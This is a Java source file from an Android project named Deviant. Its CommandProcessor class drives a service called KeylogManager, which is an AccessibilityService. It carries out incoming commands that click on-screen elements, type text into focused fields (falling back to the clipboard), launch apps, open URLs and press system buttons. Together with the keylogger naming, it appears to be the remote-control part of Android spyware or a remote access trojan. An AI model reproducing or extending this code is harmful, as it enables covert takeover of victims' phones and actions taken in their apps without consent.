package com.Deviant.pro;

import android.accessibilityservice.AccessibilityService;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.util.List;

public class CommandProcessor {

    private static final String TAG = "CommandProcessor";

    private final KeylogManager service;

    public CommandProcessor(@NonNull KeylogManager service) {
        this.service = service;
    }

    // -------------------------------------------------------------------------
    // Public API
    // -------------------------------------------------------------------------

    public void process(@NonNull String command, @Nullable String argument) {
        Log.d(TAG, "Processing command: " + command + " | arg: " + argument);

        switch (command) {
            case "click_text":
                if (argument != null) clickByText(argument);
                break;
            case "click_id":
                if (argument != null) clickById(argument);
                break;
            case "input_text":
                if (argument != null) inputText(argument);
                break;
            case "open_app":
                if (argument != null) openApp(argument);
                break;
            case "open_url":
                if (argument != null) openUrl(argument);
                break;
            case "back":
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                break;
            case "home":
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                break;
            case "recents":
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                break;
            default:
                Log.w(TAG, "Unknown command: " + command);
                break;
        }
    }

    // -------------------------------------------------------------------------
    // Private helpers
    // -------------------------------------------------------------------------

    /**
     * Find the first node whose text matches {@code text} and click it.
     * Recycles ALL matched nodes after use to prevent memory leaks.
     */
    private void clickByText(@NonNull String text) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;

        try {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
            if (nodes == null || nodes.isEmpty()) {
                Log.w(TAG, "No node found for text: " + text);
                return;
            }

            // Act on the first node only, but recycle ALL nodes in finally.
            AccessibilityNodeInfo target = nodes.get(0);
            try {
                if (target == null) return;

                if (target.isClickable()) {
                    target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "Clicked node by text: " + text);
                } else {
                    Rect bounds = new Rect();
                    target.getBoundsInScreen(bounds);
                    if (!bounds.isEmpty()) {
                        service.click(bounds.centerX(), bounds.centerY());
                        Log.d(TAG, "Tapped centre of node by text: " + text);
                    } else {
                        Log.w(TAG, "Node bounds empty for text: " + text);
                    }
                }
            } finally {
                // Recycle ALL matched nodes — including ones we didn't act on.
                for (AccessibilityNodeInfo node : nodes) {
                    if (node != null) node.recycle();
                }
            }
        } finally {
            root.recycle();
        }
    }

    /**
     * Find the first node whose view-id matches {@code id} and click it.
     * View IDs must be fully qualified: {@code "com.example.app:id/button_ok"}.
     */
    private void clickById(@NonNull String id) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;

        try {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes == null || nodes.isEmpty()) {
                Log.w(TAG, "No node found for id: " + id);
                return;
            }

            AccessibilityNodeInfo target = nodes.get(0);
            try {
                if (target == null) return;

                if (target.isClickable()) {
                    target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "Clicked node by id: " + id);
                } else {
                    Rect bounds = new Rect();
                    target.getBoundsInScreen(bounds);
                    if (!bounds.isEmpty()) {
                        service.click(bounds.centerX(), bounds.centerY());
                        Log.d(TAG, "Tapped centre of node by id: " + id);
                    } else {
                        Log.w(TAG, "Node bounds empty for id: " + id);
                    }
                }
            } finally {
                // Recycle ALL matched nodes.
                for (AccessibilityNodeInfo node : nodes) {
                    if (node != null) node.recycle();
                }
            }
        } finally {
            root.recycle();
        }
    }

    /**
     * Type {@code text} into the currently focused input field.
     *
     * minSdk = 21 so ACTION_SET_TEXT is always available — no API level branch needed.
     * Falls back to clipboard paste if ACTION_SET_TEXT returns false.
     */
    private void inputText(@NonNull String text) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;

        try {
            AccessibilityNodeInfo focused =
                    root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);

            if (focused == null) {
                Log.w(TAG, "No focused input field found for inputText");
                return;
            }

            try {
                Bundle args = new Bundle();
                args.putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);

                boolean success = focused.performAction(
                        AccessibilityNodeInfo.ACTION_SET_TEXT, args);

                if (success) {
                    Log.d(TAG, "Set text via ACTION_SET_TEXT: " + text);
                } else {
                    Log.w(TAG, "ACTION_SET_TEXT returned false — trying clipboard fallback");
                    pasteTextViaClipboard(focused, text);
                }
            } finally {
                focused.recycle();
            }
        } finally {
            root.recycle();
        }
    }

    /**
     * Clipboard-based fallback for when ACTION_SET_TEXT is unsupported by the target view.
     * Clipboard is cleared after paste to avoid polluting the user's clipboard history.
     */
    private void pasteTextViaClipboard(
            @NonNull AccessibilityNodeInfo node, @NonNull String text) {
        ClipboardManager clipboard =
                (ClipboardManager) service.getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard == null) {
            Log.e(TAG, "ClipboardManager unavailable");
            return;
        }

        // Set text on clipboard, paste into the field, then clear the clipboard.
        clipboard.setPrimaryClip(ClipData.newPlainText("input", text));
        node.performAction(AccessibilityNodeInfo.ACTION_PASTE);
        Log.d(TAG, "Pasted text via clipboard: " + text);

        // Clear clipboard so we don't pollute the user's clipboard history.
        clipboard.setPrimaryClip(ClipData.newPlainText("", ""));
    }

    /** Launch an app by its package name. */
    private void openApp(@NonNull String packageName) {
        Context ctx = service.getApplicationContext();
        Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(packageName);
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            Log.d(TAG, "Opened app: " + packageName);
        } else {
            Log.w(TAG, "No launch intent found for package: " + packageName);
        }
    }

    /**
     * Open a URL in the default browser.
     * Guards against blank/whitespace-only URLs and malformed URI strings.
     */
    private void openUrl(@NonNull String url) {
        if (url.trim().isEmpty()) {
            Log.w(TAG, "openUrl called with blank URL");
            return;
        }
        try {
            Context ctx = service.getApplicationContext();
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url.trim()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            Log.d(TAG, "Opened URL: " + url);
        } catch (IllegalArgumentException e) {
            Log.e(TAG, "Malformed URL: " + url + " — " + e.getMessage(), e);
        } catch (Exception e) {
            Log.e(TAG, "Failed to open URL: " + e.getMessage(), e);
        }
    }
}
